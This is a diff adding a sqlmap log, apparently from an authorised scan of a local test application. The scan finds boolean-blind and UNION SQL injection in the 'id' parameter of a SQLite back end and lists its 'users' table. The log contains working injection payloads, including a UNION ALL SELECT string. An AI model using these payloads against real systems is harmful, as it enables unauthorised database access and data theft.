@@ -1,0 +1,69 @@
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.8.4#stable}
+|_ -| . [']     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 18:14:15 /2026-11-07/
+
+[18:14:15] [WARNING] using '/opt/ares/security_reports/finaltest_20261107T171412Z/sqlmap' as the output directory
+[1/1] URL:
+GET http://127.0.0.1:8099/user?id=1
+do you want to test this URL? [Y/n/q]
+> Y
+[18:14:16] [INFO] testing URL 'http://127.0.0.1:8099/user?id=1'
+[18:14:16] [INFO] using '/opt/ares/security_reports/finaltest_20261107T171412Z/sqlmap/results-11072026_0614pm.csv' as the CSV results file in multiple targets mode
+[18:14:16] [INFO] testing connection to the target URL
+[18:14:16] [INFO] checking if the target is protected by some kind of WAF/IPS
+[18:14:16] [INFO] testing if the target URL content is stable
+[18:14:16] [INFO] target URL content is stable
+[18:14:16] [INFO] testing if GET parameter 'id' is dynamic
+[18:14:16] [INFO] GET parameter 'id' appears to be dynamic
+[18:14:16] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
+[18:14:16] [INFO] testing for SQL injection on GET parameter 'id'
+[18:14:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[18:14:16] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
+[18:14:17] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'SQLite' 
+it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'SQLite' extending provided level (3) and risk (2) values? [Y/n] Y
+[18:14:17] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[18:14:17] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[18:14:17] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[18:14:17] [INFO] target URL appears to have 3 columns in query
+[18:14:17] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+[18:14:17] [WARNING] applying generic concatenation (CONCAT)
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 6121=6121
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=1 UNION ALL SELECT CHAR(113,120,106,98,113)||CHAR(111,72,81,66,65,121,112,102,112,66,108,87,78,68,121,101,117,118,113,99,114,75,65,83,119,114,118,115,112,120,113,120,113,73,66,102,107,65,73,106)||CHAR(113,113,98,98,113),NULL,NULL-- hjUI
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[18:14:17] [INFO] testing SQLite
+[18:14:17] [INFO] confirming SQLite
+[18:14:17] [INFO] actively fingerprinting SQLite
+[18:14:17] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[18:14:17] [INFO] fetching tables for database: 'SQLite_masterdb'
+<current>
+[1 table]
++-------+
+| users |
++-------+
+
+[18:14:17] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 38 times
+[18:14:17] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/opt/ares/security_reports/finaltest_20261107T171412Z/sqlmap/results-11072026_0614pm.csv'
+[18:14:17] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 18:14:17 /2026-11-07/
+
